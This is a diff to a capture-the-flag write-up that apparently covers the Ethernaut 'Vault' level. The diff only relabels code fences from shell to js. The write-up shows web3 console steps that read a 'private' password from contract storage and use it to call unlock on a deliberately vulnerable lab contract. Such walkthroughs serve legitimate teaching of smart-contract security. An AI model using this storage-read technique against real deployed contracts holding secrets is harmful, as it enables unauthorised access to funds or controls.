@@ -65,26 +65,26 @@ When you access storage of a contract with web3 library, you should use like thi
 
 Check situation of locked variable.
 
-```shell
+```js
 await contract.locked()
 true
 ```
 Access **password** from our target contract's storage and appoint to pass variable.
 
-```shell
+```js
 var pass = await web3.eth.getStorageAt(contract.address,1,console.log)
 ```
 The pass variable is in hex type. Let's convert it to Utf8 which is readable format.
-```shell
+```js
 await web3.utils.hexToUtf8(pass)
 'A very strong secret password :)'
 ```
 Call unlock function and enter pass as password.
-```shell
+```js
 await contract.unlock(pass)
 ```
 Check situation of locked variable again. And, we locked the vault!
-```shell
+```js
 await contract.locked()
 false
 ```
